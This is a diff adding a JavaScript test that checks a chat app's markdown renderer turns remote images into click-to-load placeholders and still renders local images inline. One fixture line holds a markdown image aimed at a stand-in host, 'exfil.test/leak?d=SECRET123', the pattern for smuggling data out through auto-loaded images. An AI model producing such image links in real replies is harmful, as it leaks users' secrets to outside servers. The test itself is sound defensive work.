@@ -84,3 +84,59 @@ test('email sanitizer drops url()-bearing styles and remote background/poster at
       await browser.close();
     }
   });
+
+async function loadMarkdownModule() {
+  globalThis.window = { location: { origin: 'http://localhost' }, katex: null };
+  globalThis.document = {
+    readyState: 'loading',
+    addEventListener() {},
+    createElement(tag) {
+      if (tag !== 'template') throw new Error(`unsupported element: ${tag}`);
+      return {
+        _html: '',
+        content: { querySelectorAll() { return []; } },
+        set innerHTML(value) { this._html = value; },
+        get innerHTML() { return this._html; },
+      };
+    },
+  };
+  globalThis.MutationObserver = class { observe() {} };
+
+  let source = fs.readFileSync(path.join(REPO, 'static/js/markdown.js'), 'utf8');
+  source = source.replace(/import uiModule from ['"]\.\/ui\.js(?:[?#][^'"]*)?['"];?/, '');
+  source = source.replace(
+    /import \{ splitTableRow \} from ['"]\.\/markdown\/tableRow\.js['"];/,
+    () => `function splitTableRow(row) {
+      return (row || '').replace(/^\\s*\\|/, '').replace(/\\|\\s*$/, '').split('|').map(c => c.trim());
+    }`,
+  );
+  const emojiSource = fs.readFileSync(path.join(REPO, 'static/js/emojiShortcodes.js'), 'utf8')
+    .replace(/^export default .*$/m, '')
+    .replace(/export const /g, 'const ')
+    .replace(/export function /g, 'function ');
+  source = source.replace(
+    /import \{ replaceEmojiShortcodes, hasEmojiShortcode \} from ['"]\.\/emojiShortcodes\.js['"];/,
+    () => emojiSource,
+  );
+  source = source.replace(
+    /var escapeHtml = uiModule\.esc;/,
+    () => `var escapeHtml = (value) => String(value ?? '')
+      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;').replace(/'/g, '&#39;');`,
+  );
+  return import('data:text/javascript;base64,' + Buffer.from(source).toString('base64'));
+}
+
+test('chat markdown renders remote images as click-to-load placeholders', async () => {
+  const md = await loadMarkdownModule();
+
+  const remote = md.mdToHtml('Look: ![x](https://exfil.test/leak?d=SECRET123)');
+  assert.doesNotMatch(remote, /<img/i, remote);
+  assert.match(remote, /class="chat-image chat-image-remote"/);
+  assert.match(remote, /data-chat-image-src="https:\/\/exfil\.test\/leak\?d=SECRET123"/);
+  assert.match(remote, /Remote image blocked · exfil&#46;test · Click to load/);
+
+  const local = md.mdToHtml('![logo](/static/img/logo.png)');
+  assert.match(local, /<img class="chat-inline-image" src="http:\/\/localhost\/static\/img\/logo\.png" alt="logo"/);
+  assert.doesNotMatch(local, /chat-image-remote/);
+});
